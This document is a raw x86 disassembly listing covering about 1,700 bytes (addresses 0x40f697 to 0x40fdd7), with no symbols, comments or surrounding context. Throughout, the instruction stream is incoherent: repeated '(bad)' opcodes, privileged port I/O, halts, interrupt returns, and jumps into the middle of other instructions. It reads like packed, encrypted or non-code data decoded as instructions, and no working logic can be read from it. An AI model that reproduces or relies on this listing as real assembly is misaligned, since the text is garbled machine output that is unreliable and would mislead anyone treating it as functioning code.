  40f697:	mov    bh,0x68
  40f699:	(bad)  
  40f69a:	js     0x40f6f3
  40f69c:	or     ch,BYTE PTR [edx]
  40f69e:	adc    edx,DWORD PTR [ebp-0x3c]
  40f6a1:	mov    ebp,0x3492abcd
  40f6a6:	pop    ss
  40f6a7:	sbb    dh,ch
  40f6a9:	xchg   esp,eax
  40f6aa:	stos   DWORD PTR es:[edi],eax
  40f6ab:	mov    ebx,0x824436f2
  40f6b0:	out    dx,eax
  40f6b1:	sahf   
  40f6b2:	cmp    cl,BYTE PTR [ecx-0x5f918862]
  40f6b8:	mov    bh,0x13
  40f6ba:	xchg   esi,eax
  40f6bb:	adc    al,0x35
  40f6bd:	push   eax
  40f6be:	jae    0x40f65a
  40f6c0:	pop    es
  40f6c1:	int    0x1d
  40f6c3:	in     eax,0xf6
  40f6c5:	jle    0x40f677
  40f6c7:	or     al,0x5c
  40f6c9:	sbb    BYTE PTR [ecx-0x1c279ec1],bl
  40f6cf:	popa   
  40f6d0:	jl     0x40f674
  40f6d2:	iret   
  40f6d3:	add    bl,BYTE PTR [edi-0x1018cfa8]
  40f6d9:	(bad)  
  40f6da:	repnz mov al,ds:0x3fc28cd9
  40f6e0:	test   eax,0xef4857c2
  40f6e5:	mov    ds:0x321669e7,al
  40f6ea:	mov    al,0xbc
  40f6ec:	and    bh,BYTE PTR [ecx-0x2f]
  40f6ef:	add    al,0xf3
  40f6f1:	test   eax,0xd6eb07a0
  40f6f6:	xor    eax,0x961f89bd
  40f6fb:	lock dec esi
  40f6fd:	inc    ebx
  40f6fe:	repnz lods al,BYTE PTR ds:[esi]
  40f700:	dec    ebx
  40f701:	dec    esp
  40f702:	imul   ecx,edi,0xffffffaa
  40f705:	cmp    al,0xcd
  40f707:	loopne 0x40f70a
  40f709:	ret    0x9218
  40f70c:	sbb    al,0x31
  40f70e:	or     eax,0xed891c35
  40f713:	popa   
  40f714:	add    ebx,eax
  40f716:	gs jle 0x40f6f3
  40f719:	int    0xb3
  40f71b:	inc    esp
  40f71c:	xor    dl,BYTE PTR [ebx+0xccffbf9]
  40f722:	sahf   
  40f723:	fwait
  40f724:	add    al,0xb2
  40f726:	iret   
  40f727:	dec    esi
  40f728:	add    al,0xd4
  40f72a:	and    eax,0xb5346fb2
  40f72f:	dec    ebx
  40f730:	fmul   QWORD PTR [edi+edi*1]
  40f733:	es sahf 
  40f735:	loope  0x40f78f
  40f737:	ins    DWORD PTR es:[edi],dx
  40f738:	stos   DWORD PTR es:[edi],eax
  40f739:	inc    ebx
  40f73a:	xchg   edi,eax
  40f73b:	xor    eax,0xc2c2647e
  40f740:	cli    
  40f741:	imul   ebx,DWORD PTR [edx],0x8
  40f744:	jnp    0x40f6e0
  40f746:	push   es
  40f747:	mov    al,ds:0xfeef785d
  40f74c:	xchg   esi,eax
  40f74d:	mov    ebx,0x567e0fb4
  40f752:	js     0x40f7c7
  40f754:	scas   al,BYTE PTR es:[edi]
  40f755:	pop    es
  40f756:	cmp    bh,BYTE PTR [ebp+eax*8-0x6f]
  40f75a:	clc    
  40f75b:	add    BYTE PTR [ebp-0x7e65c25e],dh
  40f761:	pushf  
  40f762:	pop    ebp
  40f763:	pop    ss
  40f764:	xor    edi,DWORD PTR [ecx-0x47]
  40f767:	mov    ebx,0x525add60
  40f76c:	test   DWORD PTR [eax+eax*8+0x55],eax
  40f770:	outs   dx,BYTE PTR ds:[esi]
  40f771:	cmp    ebp,edx
  40f773:	jo     0x40f77b
  40f775:	in     al,0xfc
  40f777:	fs sbb eax,0x9f4dd4ae
  40f77d:	jnp    0x40f7da
  40f77f:	out    0xbb,eax
  40f781:	fmul   QWORD PTR [edx+0x4a]
  40f784:	loope  0x40f7e8
  40f786:	(bad)  ds:0x88018ff4
  40f78c:	xchg   ecx,eax
  40f78d:	xor    DWORD PTR [eax-0x4d1aedf6],eax
  40f793:	or     al,0xae
  40f795:	xchg   edi,eax
  40f796:	push   0xffffffce
  40f798:	sub    al,BYTE PTR [ebx+0x32cb964a]
  40f79e:	add    al,al
  40f7a0:	mov    ecx,0x60ed933b
  40f7a5:	leave  
  40f7a6:	popf   
  40f7a7:	imul   edi,esi,0xb2b72358
  40f7ad:	jae    0x40f78b
  40f7af:	sub    bh,BYTE PTR [ecx-0x7813997]
  40f7b5:	neg    DWORD PTR ds:0xd3c880c3
  40f7bb:	addr16 sbb eax,0x9c48067b
  40f7c1:	sub    DWORD PTR [edi+0x7f2f60ff],0x19
  40f7c8:	jnp    0x40f7de
  40f7ca:	loop   0x40f7eb
  40f7cc:	push   esp
  40f7cd:	lods   al,BYTE PTR ds:[esi]
  40f7ce:	cmp    DWORD PTR [edx-0x5d],esi
  40f7d1:	test   bl,cl
  40f7d3:	dec    ebx
  40f7d4:	in     eax,0x43
  40f7d6:	push   ebp
  40f7d7:	nop    DWORD PTR [ebp-0x44c96227]
  40f7de:	xor    eax,0xd5238383
  40f7e3:	mov    cl,BYTE PTR [ebp-0x455bb2ec]
  40f7e9:	pop    ss
  40f7ea:	fidivr WORD PTR [ebp-0x56]
  40f7ed:	hlt    
  40f7ee:	mov    ebp,0xf67e382
  40f7f3:	push   ebp
  40f7f4:	scas   eax,DWORD PTR es:[edi]
  40f7f5:	pop    eax
  40f7f6:	inc    esp
  40f7f7:	jo     0x40f7a1
  40f7f9:	mov    ebp,0x6e5f16f9
  40f7fe:	inc    ecx
  40f7ff:	fidiv  WORD PTR [esi-0x66bf3737]
  40f805:	hlt    
  40f806:	jmp    0x40f7b3
  40f808:	cld    
  40f809:	stos   DWORD PTR es:[edi],eax
  40f80a:	sbb    bl,BYTE PTR [edi]
  40f80c:	fisubr WORD PTR [esi+0x55]
  40f80f:	sahf   
  40f810:	xchg   esp,eax
  40f811:	loop   0x40f85f
  40f813:	pop    ecx
  40f814:	outs   dx,BYTE PTR ds:[esi]
  40f815:	jmp    0x40f7b7
  40f817:	out    dx,eax
  40f818:	xchg   edi,eax
  40f819:	adc    dl,bh
  40f81b:	jmp    0x40f80d
  40f81d:	test   DWORD PTR [ecx+edi*1-0x5b],edx
  40f821:	jne    0x40f7ed
  40f823:	adc    dl,bl
  40f825:	rcr    DWORD PTR [ecx+0x70],cl
  40f828:	sbb    al,0x29
  40f82a:	in     eax,dx
  40f82b:	mul    BYTE PTR [eax]
  40f82d:	js     0x40f844
  40f82f:	xchg   ch,cl
  40f831:	fs leave 
  40f833:	sbb    BYTE PTR [esi+0x1c],bl
  40f836:	inc    edx
  40f837:	jne    0x40f861
  40f839:	arpl   si,di
  40f83b:	cmp    BYTE PTR [ebp+0x32],dh
  40f83e:	pusha  
  40f83f:	dec    edx
  40f840:	ret    0x50a4
  40f843:	mul    DWORD PTR [edx+edi*2+0x5d]
  40f847:	mov    ds:0x297e1f62,al
  40f84c:	fld    TBYTE PTR [edi-0x4d]
  40f84f:	pop    ds
  40f850:	imul   edx,DWORD PTR [ebx],0xffffffa5
  40f853:	sbb    BYTE PTR [ebx],al
  40f855:	pop    es
  40f856:	in     al,dx
  40f857:	xchg   eax,ecx
  40f859:	inc    ebx
  40f85a:	imul   DWORD PTR [edx+0x37268226]
  40f860:	push   edx
  40f861:	aaa    
  40f862:	sbb    DWORD PTR [ebp-0x69286a05],esi
  40f868:	rcr    BYTE PTR [ebx+0x5bbfb51b],cl
  40f86e:	bound  esi,QWORD PTR [edi-0x51]
  40f871:	into   
  40f872:	push   ebp
  40f873:	cld    
  40f874:	or     dl,BYTE PTR [ebx+0x568c5055]
  40f87a:	sbb    ebx,DWORD PTR [eax-0x48]
  40f87d:	add    DWORD PTR [edx-0x36529c1d],ecx
  40f883:	inc    esi
  40f884:	shl    BYTE PTR [ecx+eiz*8],1
  40f887:	out    0xa6,eax
  40f889:	push   ebx
  40f88a:	mov    ds:0x118114d1,eax
  40f88f:	mov    bh,0xc
  40f891:	jae    0x40f8ee
  40f893:	xor    DWORD PTR [esi],edi
  40f895:	pop    esi
  40f896:	cdq    
  40f897:	cmp    ebp,DWORD PTR [esi-0x642ddb8c]
  40f89d:	shl    cl,cl
  40f89f:	shr    BYTE PTR [ebx-0x1b],cl
  40f8a2:	mov    ds:0xb536c0eb,al
  40f8a7:	sub    DWORD PTR [ebp-0x45],esp
  40f8aa:	jb     0x40f894
  40f8ac:	(bad)  
  40f8ad:	cld    
  40f8ae:	in     eax,dx
  40f8af:	adc    DWORD PTR [ebx-0x159c00ff],0x46eb96e2
  40f8b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8ba:	or     DWORD PTR [eax],esi
  40f8bc:	inc    ecx
  40f8bd:	sub    BYTE PTR [ebx-0x2e],cl
  40f8c0:	cwde   
  40f8c1:	enter  0x1fd7,0x93
  40f8c5:	cmp    al,0x93
  40f8c7:	jg     0x40f942
  40f8c9:	adc    eax,esi
  40f8cb:	mov    bh,0xde
  40f8cd:	dec    ecx
  40f8ce:	sti    
  40f8cf:	iret   
  40f8d0:	hlt    
  40f8d1:	jmp    0x9807:0x11530839
  40f8d8:	mov    esi,0xeb826942
  40f8dd:	cmp    ecx,DWORD PTR [edi+0x65]
  40f8e0:	inc    ebp
  40f8e1:	and    BYTE PTR [ecx-0x60],bl
  40f8e4:	enter  0xcb92,0x19
  40f8e8:	cmp    esi,DWORD PTR [eax]
  40f8ea:	ja     0x40f8b6
  40f8ec:	(bad)  [edi+0x7e]
  40f8ef:	sub    dl,al
  40f8f1:	in     al,0xd4
  40f8f3:	dec    esp
  40f8f4:	int    0x2e
  40f8f6:	stc    
  40f8f7:	cmp    edi,DWORD PTR [ecx+0xa]
  40f8fa:	cmp    esi,DWORD PTR [ecx+ecx*8-0x1f1d82f]
  40f901:	call   0x7123c248
  40f906:	rep ins BYTE PTR es:[edi],dx
  40f908:	in     al,0xfb
  40f90a:	add    eax,DWORD PTR [ecx]
  40f90c:	sbb    DWORD PTR [eax],edi
  40f90e:	lahf   
  40f90f:	test   eax,0x663c1cb2
  40f914:	adc    BYTE PTR [edi+ecx*8+0x4a2dbd35],cl
  40f91b:	jns    0x40f995
  40f91d:	xchg   edx,eax
  40f91e:	xor    eax,edi
  40f920:	push   ss
  40f921:	in     al,0x9c
  40f923:	mov    eax,0x82414a7b
  40f928:	sub    BYTE PTR [edi-0x6c4c28a0],dh
  40f92e:	sbb    dl,bl
  40f930:	shl    DWORD PTR [edx-0x69286582],0xee
  40f937:	or     BYTE PTR [edx+edx*8+0x44],al
  40f93b:	daa    
  40f93c:	mov    al,ah
  40f93e:	hlt    
  40f93f:	cmp    bh,dh
  40f941:	and    dl,cl
  40f943:	xor    bh,BYTE PTR [ecx+0x5b]
  40f946:	ss das 
  40f948:	imul   esp,ecx,0x261430a2
  40f94e:	int    0xaa
  40f950:	call   0x2544585
  40f955:	push   cs
  40f956:	mov    al,ds:0xab8b7ada
  40f95b:	xor    BYTE PTR [esi-0x3e233ed6],dl
  40f961:	dec    esi
  40f962:	push   cs
  40f963:	sahf   
  40f964:	fcomp  DWORD PTR [ebx-0x38]
  40f967:	aaa    
  40f968:	pop    edi
  40f969:	test   al,0xcc
  40f96b:	pop    edx
  40f96c:	mov    esp,0x1766102
  40f971:	fstp   QWORD PTR [ebx+0x8]
  40f974:	and    BYTE PTR [esp+ebx*2+0x42ae7c1],cl
  40f97b:	push   ds
  40f97c:	pop    ecx
  40f97d:	repnz xchg ecx,eax
  40f97f:	outs   dx,DWORD PTR ds:[esi]
  40f980:	psubsb mm1,QWORD PTR [ebp+0x71]
  40f984:	add    DWORD PTR [ecx+0x168e4231],0xa303d9d0
  40f98e:	retf   
  40f98f:	add    DWORD PTR gs:[ebp-0x7a],edi
  40f993:	xchg   ebx,eax
  40f994:	jmp    0x40f9e8
  40f996:	iret   
  40f997:	inc    ecx
  40f998:	int3   
  40f999:	dec    esi
  40f99a:	cmp    BYTE PTR [edi+ecx*2],0x7b
  40f99e:	(bad)  
  40f99f:	sbb    BYTE PTR [edi+edx*8],al
  40f9a2:	xchg   esp,eax
  40f9a3:	xlat   BYTE PTR ds:[ebx]
  40f9a4:	jbe    0x40f96b
  40f9a6:	inc    ebx
  40f9a7:	fsubr  DWORD PTR [edx]
  40f9a9:	jbe    0x40f9de
  40f9ab:	mov    edi,0xd91b2265
  40f9b0:	inc    eax
  40f9b1:	mov    eax,0x93c2b1df
  40f9b6:	xor    eax,0xa9fba95a
  40f9bb:	sub    esp,DWORD PTR ds:[ecx+0x34e1364c]
  40f9c2:	lods   al,BYTE PTR ds:[esi]
  40f9c3:	mov    bl,0x11
  40f9c5:	inc    ebx
  40f9c6:	dec    eax
  40f9c7:	xchg   edx,eax
  40f9c8:	push   eax
  40f9c9:	data16 jno 0x40f9cb
  40f9cc:	mov    al,0x5e
  40f9ce:	sub    eax,0x538cb28d
  40f9d3:	or     eax,0xcdb56a7b
  40f9d8:	push   ebp
  40f9d9:	mov    BYTE PTR [edx-0x56e4a7f4],ah
  40f9df:	fistp  DWORD PTR [ebp+esi*4-0xf01c381]
  40f9e6:	bound  esp,QWORD PTR cs:[edx-0xaa9bf17]
  40f9ed:	sbb    BYTE PTR [esi+ecx*1-0x56e9c6ee],ch
  40f9f4:	call   0xd0171803
  40f9f9:	adc    BYTE PTR [edx-0xe],al
  40f9fc:	fisubr WORD PTR [esi+0x58b8b0f5]
  40fa02:	cdq    
  40fa03:	mov    ?,WORD PTR [ebx+edi*8-0x4]
  40fa07:	sub    esi,ebx
  40fa09:	sbb    ax,0x7287
  40fa0d:	outs   dx,BYTE PTR ds:[esi]
  40fa0e:	lods   al,BYTE PTR ds:[esi]
  40fa0f:	and    al,0x43
  40fa11:	push   ecx
  40fa12:	aam    0x6
  40fa14:	and    DWORD PTR ds:[ebx-0x2d],ebx
  40fa18:	pop    esi
  40fa19:	hlt    
  40fa1a:	sub    DWORD PTR [ebx],esi
  40fa1c:	test   BYTE PTR [esi],dh
  40fa1e:	mov    ch,0xa2
  40fa20:	dec    ebx
  40fa21:	in     al,dx
  40fa22:	inc    edi
  40fa23:	cmp    BYTE PTR [ecx],0x44
  40fa26:	rol    BYTE PTR [esi+0x1],cl
  40fa29:	ret    
  40fa2a:	xor    eax,0xb9a8220a
  40fa2f:	(bad)  
  40fa30:	sbb    bh,BYTE PTR [edx-0x6a272e97]
  40fa36:	out    dx,al
  40fa37:	dec    esi
  40fa38:	cmp    al,0x2
  40fa3a:	bound  ebx,QWORD PTR [esi]
  40fa3c:	push   edi
  40fa3d:	dec    ebx
  40fa3e:	jle    0x40f9c9
  40fa40:	adc    ebx,DWORD PTR [esi-0x152acc3c]
  40fa46:	fwait
  40fa47:	sbb    ecx,DWORD PTR [ebp-0xfdaff50]
  40fa4d:	and    eax,0x6c6c748d
  40fa52:	mov    ds:0xa8bafecb,al
  40fa57:	dec    esi
  40fa58:	(bad)  
  40fa5a:	pop    edx
  40fa5b:	sbb    al,BYTE PTR [ebx]
  40fa5d:	jno    0x40f9f0
  40fa5f:	mov    esi,0xe46ec064
  40fa64:	in     al,0xaa
  40fa66:	adc    dh,BYTE PTR ds:[edi+0x3e]
  40fa6a:	jnp    0x40fa31
  40fa6c:	push   ecx
  40fa6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa6e:	out    0xdd,eax
  40fa70:	cwde   
  40fa71:	stos   BYTE PTR es:[edi],al
  40fa72:	sub    BYTE PTR ds:0xa19145eb,dh
  40fa78:	nop
  40fa79:	and    DWORD PTR [esi],edx
  40fa7b:	js     0x40fa34
  40fa7d:	into   
  40fa7e:	mov    esp,0x1876d0d9
  40fa83:	lock or eax,0xf98b5f3
  40fa89:	add    DWORD PTR [ebx+ebp*1-0x2abf6019],ebp
  40fa90:	jp     0x40fa6f
  40fa92:	loopne 0x40fa84
  40fa94:	jae    0x40fa76
  40fa96:	mov    ecx,0xaa461504
  40fa9b:	and    eax,0x1d2f6ebe
  40faa0:	and    edi,ebp
  40faa2:	jnp    0x40fa53
  40faa4:	mov    bl,0xb7
  40faa6:	in     al,dx
  40faa7:	int3   
  40faa8:	mov    DWORD PTR [ebp-0x3b],edx
  40faab:	(bad)  
  40faac:	and    BYTE PTR gs:[ebx+0x3b],dl
  40fab0:	adc    ch,BYTE PTR [ecx+0x26]
  40fab3:	(bad)  
  40fab4:	cld    
  40fab5:	cmc    
  40fab6:	push   cs
  40fab7:	jp     0x40fa97
  40fab9:	mov    edx,0xbec28fd
  40fabe:	cmp    edx,DWORD PTR [esi-0x9]
  40fac1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fac2:	aam    0x21
  40fac4:	mov    esi,ecx
  40fac6:	lock add al,0xcd
  40fac9:	and    bl,BYTE PTR [eax+eax*1+0xa3906ca]
  40fad0:	add    dh,BYTE PTR [edi-0x6ed65046]
  40fad6:	sahf   
  40fad7:	jae    0x40fa97
  40fad9:	rcl    DWORD PTR [eax+eax*4-0x1e],cl
  40fadd:	adc    al,0xd4
  40fadf:	mov    al,ds:0xb1cef9ba
  40fae4:	lea    ecx,[ecx-0x69]
  40fae7:	ret    
  40fae8:	ins    BYTE PTR es:[edi],dx
  40fae9:	inc    ebp
  40faea:	push   0xbce1b6fa
  40faef:	push   esp
  40faf0:	and    eax,0x7ce00cc0
  40faf5:	lods   eax,DWORD PTR ds:[esi]
  40faf6:	push   es
  40faf7:	js     0x40fb72
  40faf9:	stos   DWORD PTR es:[edi],eax
  40fafa:	popf   
  40fafb:	add    BYTE PTR [ecx],bl
  40fafd:	inc    esi
  40fafe:	xchg   esi,eax
  40faff:	dec    ebp
  40fb00:	mov    ebx,0xac905c9b
  40fb05:	or     al,BYTE PTR [ecx+0x62]
  40fb08:	jns    0x40fadf
  40fb0a:	aas    
  40fb0b:	cmp    eax,0xc3d679c7
  40fb10:	imul   ch
  40fb12:	mov    ds:0xbd45a28a,al
  40fb17:	add    edx,DWORD PTR [edx]
  40fb19:	jecxz  0x40fb6c
  40fb1b:	popf   
  40fb1c:	cs or  ah,dl
  40fb1f:	push   ebx
  40fb20:	adc    ebp,DWORD PTR [edi]
  40fb22:	ins    DWORD PTR es:[edi],dx
  40fb23:	gs (bad) 
  40fb25:	out    dx,eax
  40fb26:	xchg   esi,eax
  40fb27:	stc    
  40fb28:	in     eax,0xb9
  40fb2a:	loopne 0x40fb5e
  40fb2c:	fiadd  WORD PTR [ebx]
  40fb2e:	xor    eax,0x334873d3
  40fb33:	adc    al,dl
  40fb35:	pop    esi
  40fb36:	inc    ecx
  40fb37:	pop    ss
  40fb38:	mov    ecx,DWORD PTR [esi+eiz*1]
  40fb3b:	mov    edx,0x98120309
  40fb40:	outs   dx,DWORD PTR ds:[esi]
  40fb41:	rol    BYTE PTR [ebx+0xa],cl
  40fb44:	dec    esi
  40fb45:	jb     0x40fb71
  40fb47:	outs   dx,BYTE PTR ds:[esi]
  40fb48:	iret   
  40fb49:	sub    BYTE PTR [eax-0x1f26c565],bh
  40fb4f:	(bad)  
  40fb50:	push   ss
  40fb51:	out    dx,eax
  40fb52:	push   DWORD PTR [esi]
  40fb54:	mov    ebx,0xea22cb4f
  40fb59:	sub    ebp,DWORD PTR [ebx-0x38c71e58]
  40fb5f:	or     BYTE PTR [edx-0x6a],cl
  40fb62:	or     DWORD PTR [ecx-0x29],ecx
  40fb65:	xchg   esp,eax
  40fb66:	shr    cl,cl
  40fb68:	(bad)  
  40fb69:	pop    edx
  40fb6a:	ror    BYTE PTR [edx],0xc1
  40fb6d:	mov    ebx,0x780bb51
  40fb72:	lea    eax,[ecx-0x55a3019e]
  40fb78:	sbb    esp,DWORD PTR [ebx]
  40fb7a:	inc    ecx
  40fb7b:	jae    0x40fb5b
  40fb7d:	cwde   
  40fb7e:	cld    
  40fb7f:	or     ch,BYTE PTR [ebx+0x54]
  40fb82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb83:	scas   al,BYTE PTR es:[edi]
  40fb84:	jmp    FWORD PTR [edx]
  40fb86:	and    eax,0xfb5f52eb
  40fb8b:	fwait
  40fb8c:	scas   al,BYTE PTR es:[edi]
  40fb8d:	nop
  40fb8e:	int3   
  40fb8f:	inc    esi
  40fb90:	xchg   ebx,eax
  40fb91:	mov    edx,0xd3776c99
  40fb96:	fwait
  40fb97:	call   0xd4c5f609
  40fb9c:	fisubr DWORD PTR [di+0x24c9]
  40fba1:	xchg   esp,eax
  40fba2:	aam    0x1e
  40fba4:	xchg   ecx,eax
  40fba5:	pop    esi
  40fba6:	test   BYTE PTR [esi-0x53],bl
  40fba9:	loopne 0x40fc1a
  40fbab:	xor    al,0xc2
  40fbad:	stos   BYTE PTR es:[edi],al
  40fbae:	or     DWORD PTR ds:0x845943cf,ebp
  40fbb4:	std    
  40fbb5:	adc    esi,DWORD PTR [edx-0x9f3be39]
  40fbbb:	scas   al,BYTE PTR es:[edi]
  40fbbc:	dec    ebx
  40fbbd:	dec    ebx
  40fbbe:	or     ebx,ebp
  40fbc0:	mov    esp,0x60a88f81
  40fbc5:	(bad)  
  40fbc6:	xchg   ebx,eax
  40fbc7:	ss in  al,dx
  40fbc9:	lock fnstenv [edx+eax*8-0x7a9404ee]
  40fbd1:	mov    eax,ds:0x77e0189
  40fbd6:	xor    BYTE PTR [edx+0x7447ace5],bl
  40fbdc:	cld    
  40fbdd:	and    al,0xdb
  40fbdf:	lods   eax,DWORD PTR ds:[esi]
  40fbe0:	xchg   esp,eax
  40fbe1:	(bad)  
  40fbe2:	mov    ds:0x7c5f97b3,eax
  40fbe7:	sub    al,0x68
  40fbe9:	or     ebp,DWORD PTR [ebp+0x3a0b07a]
  40fbef:	mov    ah,0xc1
  40fbf1:	outs   dx,BYTE PTR ds:[esi]
  40fbf2:	rcr    BYTE PTR [ebp+0x7c82eb47],cl
  40fbf8:	in     eax,0x4e
  40fbfa:	les    eax,FWORD PTR [edi-0x4884ef6a]
  40fc00:	in     eax,0x6d
  40fc02:	mov    bl,0xe7
  40fc04:	retf   
  40fc05:	loope  0x40fc84
  40fc07:	dec    ebp
  40fc08:	adc    edi,DWORD PTR [esi]
  40fc0a:	sahf   
  40fc0b:	dec    ebp
  40fc0c:	sub    dl,BYTE PTR [edx-0x60]
  40fc0f:	rcr    BYTE PTR [eax*2+0x37f79cf4],cl
  40fc16:	pop    ds
  40fc17:	cdq    
  40fc18:	mov    cl,0x6c
  40fc1a:	ror    BYTE PTR [eax],cl
  40fc1c:	dec    esp
  40fc1d:	stc    
  40fc1e:	mov    eax,0xc9535aa5
  40fc23:	dec    ebp
  40fc24:	mov    dl,0xad
  40fc26:	add    eax,0x98ad70f
  40fc2b:	lds    ebx,FWORD PTR [ebx+0xb]
  40fc2e:	mov    eax,ds:0xbe327126
  40fc33:	(bad)  
  40fc34:	sbb    DWORD PTR [ebp-0x4cea271c],esi
  40fc3a:	les    ecx,FWORD PTR [eax+eax*1+0x3a]
  40fc3e:	scas   al,BYTE PTR es:[edi]
  40fc3f:	je     0x40fca2
  40fc41:	aas    
  40fc42:	outs   dx,DWORD PTR ds:[esi]
  40fc43:	and    ebx,ebx
  40fc45:	adc    esp,esi
  40fc47:	aas    
  40fc48:	mov    dl,0x35
  40fc4a:	push   ebx
  40fc4b:	adc    DWORD PTR [ebx-0x7c],0x8d47f863
  40fc52:	leave  
  40fc53:	lahf   
  40fc54:	stos   DWORD PTR es:[edi],eax
  40fc55:	ret    
  40fc56:	mov    ch,0x6c
  40fc58:	add    bh,dh
  40fc5a:	inc    esi
  40fc5b:	jbe    0x40fc07
  40fc5d:	out    0xd6,eax
  40fc5f:	addr16 cmc 
  40fc61:	(bad)
  40fc64:	ret    
  40fc65:	adc    al,0xa4
  40fc67:	sub    BYTE PTR [eax+0x53b94737],ch
  40fc6d:	into   
  40fc6e:	int3   
  40fc6f:	xchg   ebp,eax
  40fc70:	push   es
  40fc71:	sub    ecx,edx
  40fc73:	sub    eax,0xc1646561
  40fc78:	adc    ecx,DWORD PTR [ecx-0x24]
  40fc7b:	mov    es,WORD PTR [ebp+0x5f]
  40fc7e:	push   0xa5148acc
  40fc83:	mov    esp,0x4f183916
  40fc88:	push   edx
  40fc89:	mov    al,0x86
  40fc8b:	dec    ecx
  40fc8c:	xchg   ecx,eax
  40fc8d:	ret    0xb065
  40fc90:	je     0x40fc32
  40fc92:	popa   
  40fc93:	dec    ebp
  40fc94:	pushf  
  40fc95:	adc    DWORD PTR [edi],ebp
  40fc97:	sub    al,0xbf
  40fc99:	push   edx
  40fc9a:	popa   
  40fc9b:	mov    ebx,DWORD PTR [ecx+edx*1]
  40fc9e:	mov    eax,ds:0xa7d259c3
  40fca3:	(bad)  
  40fca4:	sar    ecx,cl
  40fca6:	sbb    ah,bl
  40fca8:	or     ebx,DWORD PTR [ebp-0x59cba26c]
  40fcae:	in     al,0x57
  40fcb0:	sti    
  40fcb1:	cmp    DWORD PTR [ebp-0x42],ebp
  40fcb4:	push   edx
  40fcb5:	xchg   ecx,eax
  40fcb6:	fisttp DWORD PTR [eax+0x5a]
  40fcb9:	sub    al,0x64
  40fcbb:	sbb    esp,ebp
  40fcbd:	adc    BYTE PTR [esi+0x6],0x5e
  40fcc1:	pushf  
  40fcc2:	scas   eax,DWORD PTR es:[edi]
  40fcc3:	(bad)  
  40fcc4:	cmc    
  40fcc5:	cli    
  40fcc6:	inc    edx
  40fcc7:	stos   DWORD PTR es:[edi],eax
  40fcc8:	ret    
  40fcc9:	xchg   edx,eax
  40fcca:	or     al,0xd6
  40fccc:	and    BYTE PTR [ecx],bh
  40fcce:	cmp    eax,DWORD PTR [ecx-0x32]
  40fcd1:	cdq    
  40fcd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcd3:	add    eax,0x2375bfc
  40fcd8:	lea    esp,[eax-0x67]
  40fcdb:	iret   
  40fcdc:	push   esi
  40fcdd:	mov    edx,0xd6fe99bd
  40fce2:	sbb    eax,0xc86dde3
  40fce7:	cmp    al,BYTE PTR [ebx-0xeecfef1]
  40fced:	sbb    DWORD PTR [eax-0x6d],esi
  40fcf0:	mov    ebp,0xec57e42a
  40fcf5:	jecxz  0x40fcb5
  40fcf7:	mov    ebp,ebp
  40fcf9:	loop   0x40fc80
  40fcfb:	cmp    dl,dh
  40fcfd:	pop    eax
  40fcfe:	imul   edx,DWORD PTR [edx],0xffffffd5
  40fd01:	pop    es
  40fd02:	jmp    0x43d3:0x71e50492
  40fd09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd0a:	cmp    BYTE PTR [edi+0x257d17ed],0x98
  40fd11:	not    DWORD PTR [ecx]
  40fd13:	adc    BYTE PTR [edx],ah
  40fd15:	push   ss
  40fd16:	sub    BYTE PTR [edi-0x45],bl
  40fd19:	or     BYTE PTR [edi-0x317d849e],0x71
  40fd20:	and    ebx,edi
  40fd22:	mov    BYTE PTR [edi-0x5dc04dfe],dl
  40fd28:	dec    eax
  40fd29:	dec    eax
  40fd2a:	inc    ecx
  40fd2b:	arpl   WORD PTR [edx+0x684a5bbe],cx
  40fd31:	xor    eax,0x9184a80b
  40fd36:	sbb    al,0xc4
  40fd38:	iret   
  40fd39:	lods   eax,DWORD PTR ds:[esi]
  40fd3a:	push   edi
  40fd3b:	leave  
  40fd3c:	mov    al,ds:0x592f3a17
  40fd41:	xchg   edx,eax
  40fd42:	icebp  
  40fd43:	or     al,0xd
  40fd45:	test   eax,0x6c4f0d54
  40fd4a:	out    dx,eax
  40fd4b:	scas   al,BYTE PTR es:[edi]
  40fd4c:	push   ebp
  40fd4d:	pop    edi
  40fd4e:	jmp    0x7e88b0aa
  40fd53:	stos   DWORD PTR es:[edi],eax
  40fd54:	mov    eax,0xa242aacb
  40fd59:	dec    esi
  40fd5a:	mov    eax,ds:0xb3c468ca
  40fd5f:	mov    dl,BYTE PTR [esp+edx*2+0x754ea4c5]
  40fd66:	outs   dx,DWORD PTR ss:[esi]
  40fd68:	imul   BYTE PTR [edi-0x1d]
  40fd6b:	push   cs
  40fd6c:	add    al,0x1f
  40fd6e:	add    eax,0xd126dc67
  40fd73:	adc    BYTE PTR [ecx],ch
  40fd75:	and    eax,0xac656f98
  40fd7a:	(bad)  
  40fd7b:	dec    ebp
  40fd7c:	repnz outs dx,BYTE PTR ds:[esi]
  40fd7e:	or     DWORD PTR [ecx+0x19],0xffffffca
  40fd82:	jmp    FWORD PTR [esi]
  40fd84:	repz pop eax
  40fd86:	into   
  40fd87:	(bad)  
  40fd88:	inc    edx
  40fd89:	mov    bh,0x83
  40fd8b:	xor    BYTE PTR [edi-0x3fbaa011],bh
  40fd91:	loop   0x40fdec
  40fd93:	int3   
  40fd94:	inc    esi
  40fd95:	cwde   
  40fd96:	out    0x5,eax
  40fd98:	pop    ebx
  40fd99:	pop    esp
  40fd9a:	retf   
  40fd9b:	ds dec esp
  40fd9d:	out    dx,eax
  40fd9e:	pop    edi
  40fd9f:	out    0x69,al
  40fda1:	push   edi
  40fda2:	mov    esi,0x740ccf1b
  40fda7:	xor    dh,al
  40fda9:	pop    ecx
  40fdaa:	and    DWORD PTR [edi],esp
  40fdac:	and    ch,BYTE PTR [ebx]
  40fdae:	pop    edi
  40fdaf:	out    0xbc,al
  40fdb1:	in     eax,0x9b
  40fdb3:	pop    ecx
  40fdb4:	jo     0x40fd7a
  40fdb6:	mov    edi,0x2fc09eb1
  40fdbb:	sbb    al,0x56
  40fdbd:	stos   DWORD PTR es:[edi],eax
  40fdbe:	repz rcr DWORD PTR fs:[edx+eiz*1+0x18919afe],0x87
  40fdc8:	inc    edx
  40fdc9:	scas   eax,DWORD PTR es:[edi]
  40fdca:	daa    
  40fdcb:	sahf   
  40fdcc:	mov    ecx,0xbe864e1
  40fdd1:	push   edi
  40fdd2:	xor    eax,0xbcd52be1
  40fdd7:	in     eax,dx
